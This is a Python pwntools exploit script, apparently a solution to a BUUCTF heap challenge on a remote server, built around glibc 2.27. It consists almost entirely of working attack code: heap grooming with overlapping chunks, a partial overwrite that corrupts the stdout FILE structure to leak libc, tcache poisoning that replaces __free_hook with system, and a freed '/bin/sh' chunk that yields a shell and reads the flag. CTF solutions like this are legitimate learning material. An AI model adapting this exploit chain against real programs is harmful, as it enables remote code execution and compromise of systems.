from pwn import *

#p = process('./pwn_patched')
p = remote('node4.buuoj.cn', 29848)
context(arch='amd64', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']
#libc = ELF('./libc.so.6')
elf = ELF('./pwn')
#libc = ELF('/home/kali/glibc/libs/2.27-3ubuntu1_amd64/libc-2.27.so')
libc = ELF('./libc-2.27.so')

#gdb.attach(p, """
#    b *$rebase(0xb75)
#    b *$rebase(0xce7)
#""")

menu = b"choice:"
def add(size, msg=b'A\n'):
    p.sendlineafter(menu, b'1')
    p.sendlineafter(b"Size:", str(size).encode())
    p.sendafter(b"Data:", msg)

def free(idx):
    p.sendlineafter(menu, b'2')
    p.sendlineafter(b"Index:", str(idx).encode())

def pwn():
    add(0x410) #0
    add(0x20)  #1
    add(0x20)  #2
    add(0x30)  #3
    add(0x4f0) #4
    add(0x20, b'/bin/sh\x00\n') #5
    free(0)
    free(3)
    add(0x38, b'\x00'*0x30 + p64(0x420+0x30+0x30+0x40))  #0
    free(4)

    free(1)
    add(0x410) #0
    add(0x10, p16(0xc760)+ b'\n') #1
    add(0x20) #3
    add(0x27, flat(0xfbad1887, 0, 0, 0)+ b'\x58\n') #4
    libc.address = u64(p.recv(8)) - libc.sym['_IO_file_jumps']
    print(f"{libc.address = :x}")
    
    one = [0x4f2c5,0x4f322,0xe569f,0xe5858,0xe585f,0xe5863,0x10a398,0x10a38c]

    free(0)
    add(0x50, b'\x00'*0x38 + p64(0x41) + p64(libc.sym['__free_hook'])+b'\n')

    add(0x30)
    add(0x30, flat(libc.sym['system'])+ b'\n')

    free(5)
    #gdb.attach(p)
    #pause()

    p.sendline(b'cat flag*')
    p.interactive()

while True:
    try:
        pwn()
    except:
        p.close()
        print('....')
    break
